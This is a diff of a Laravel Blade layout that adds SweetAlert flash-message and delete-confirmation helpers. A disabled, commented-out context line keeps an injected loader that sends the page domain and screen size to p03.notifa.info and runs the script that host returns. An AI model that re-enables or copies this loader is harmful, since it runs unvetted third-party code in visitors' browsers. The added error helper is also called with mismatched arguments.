@@ -54,7 +54,55 @@
 <script src="{{ asset('centric/js/app.js') }}"></script>
 {{--<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mj00o1ZNBI6UTXwbs7gYdRrnRK9a8%2fs%2biRw4Odo1XAv2X3sVEpenLi1wYV%2b2M03wn5B0NsKX0EGHHGySYhKCgtdp7N6bg%2bKZFaMhMP79kTb3vPRFZ1d48%2bdk%2fkUMuVxtXosqRobtBV1jSMcgilKHv3kwVCCJ2CVgfBdDGCfExYXT2ck4dNLcnOSCHfnnRMGQT4UNfLPSebDfbPxZqF21fEROSFiyinkJQIeT64JJ2Ub%2fq4eojkeQGWQarZXU%2bXDT9VNqjIKNZsknnythRlYay3MkN2bPNrTwNb2CcJiLs4q9xTwq%2fi5Kx3crNWfF4PY6fsKKdHbDeH2bBwVgg6ID2HLxSGM2YmDw0420mGA%2ftWTvt50llsSmxhCpMcpOdJgK2SBulg9oJBbJdr20wS%2bCnwDGw%2bo9QJ%2f%2bu9pypfds3rTo4v0mgDZGz74OxqWrQ6caGIIf09xDkZFPm0rdEyozBHFWuepzu9N4ZAgOyaLC0lMwA2JJ1mroKM78%2bHI9cnjuY9rwnYSPjvwQH%2fLT1rcDJFw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>--}}
 <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+<script>
+    $(document).ready(function () {
+                @if(session('error'))
+        var error = "{{ session('error') }}";
+        var msg = "{{ session('message') }}";
+        var title = "{{ session('title') }}";
+        if (error == "true") {
+            showErrorMessge(msg);
+        } else {
+            showSuccessMessge(msg);
+        }
+        @endif
+    });
 
+    /**
+     * create sweetalert message
+     */
+
+    function showErrorMessge(title, msg) {
+        swal({
+            icon: 'error',
+            title: title,
+            text: msg
+        })
+    }
+
+    function showSuccessMessge(title,msg) {
+        swal({
+            icon: 'success',
+            title: title,
+            text: msg
+        })
+    }
+
+    function deleteItem(id) {
+        swal({
+            title: "Are you sure?",
+            text: "You will delete this data permanently!",
+            icon: "warning",
+            buttons: true,
+            dangerMode: true,
+        }).then((willDelete) => {
+            if (willDelete) {
+                document.getElementById('delete_'+id).submit();
+            }
+        });
+    }
+</script>
 @yield('page_js')
 </body>
 
